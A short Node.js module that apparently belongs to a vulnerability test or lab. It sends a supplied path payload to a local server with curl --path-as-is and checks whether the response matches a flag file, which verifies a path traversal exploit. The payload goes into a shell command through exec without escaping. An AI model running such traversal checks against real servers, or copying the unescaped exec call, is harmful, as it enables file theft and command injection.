function exploitFunction(payload) {
  const path = require("path");
  const pathToFlag = path.resolve(__dirname, "../flag.html");

  const fs = require("fs");
  const hostsFile = fs.readFileSync(pathToFlag).toString();

  // Simulate the server handling the request
  const attack_string = `curl -v --path-as-is "http://127.0.0.1:9999${payload}"`;

  const { exec } = require("child_process");
  exec(attack_string, (error, stdout) => {
    if (stdout === hostsFile) {
      console.log("Exploit successful!");
    } else {
      console.log("Exploit failed.");
    }
  });
}

module.exports = { exploitFunction };